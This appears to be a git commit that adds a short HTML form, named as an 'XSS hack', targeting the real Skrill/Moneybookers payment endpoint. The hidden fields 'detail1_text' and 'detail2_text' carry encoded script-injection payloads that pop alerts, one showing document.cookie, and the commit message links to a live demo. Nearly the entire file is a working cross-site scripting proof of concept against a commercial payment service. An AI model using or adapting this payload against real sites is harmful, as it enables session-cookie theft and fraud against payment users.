33fae2ff7da346ee41d8bb962083b5030b967d14
Roman Ananyev <aTastyCookie@users.noreply.github.com>
2014-10-09 18:39:10 +0400

    Create xss_hack_super_3d_amoled_retina.php
    Work not with email! I think what only identified users!
    
    in demo you can check http://atastycookie.me/skrill/

---
+++ xss_hack_super_3d_amoled_retina.php
@@ -0,0 +1,19 @@
+<form action="https://www.moneybookers.com/app/payment.pl">
+	
+	<input type="hidden" name="pay_to_email" value="pay_to_email@gmail.com"> 
+	<input type="hidden" name="language" value="EN">
+	<input type="hidden" name="amount" value="3">
+	<input type="hidden" name="currency" value="EUR">
+
+	<input type="hidden" name="amount2_description" value="Product Price:">
+	<input type="hidden" name="amount2" value="2">
+	<input type="hidden" name="detail1_description" value="Product:">
+	<input type="hidden" name="detail1_text" value="&quot;&gt;&lt;script &gt;alert("ups! You hack SKRILL")&lt;/script &gt;">
+	
+	<input type="hidden" name="amount3_description" value="Product Price:">
+	<input type="hidden" name="amount3" value="1">
+	<input type="hidden" name="detail2_description" value="Product:">
+	<input type="hidden" name="detail2_text" value="&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;">
+	
+	<input type="submit" value="hacktheskrill"/>
+</form>
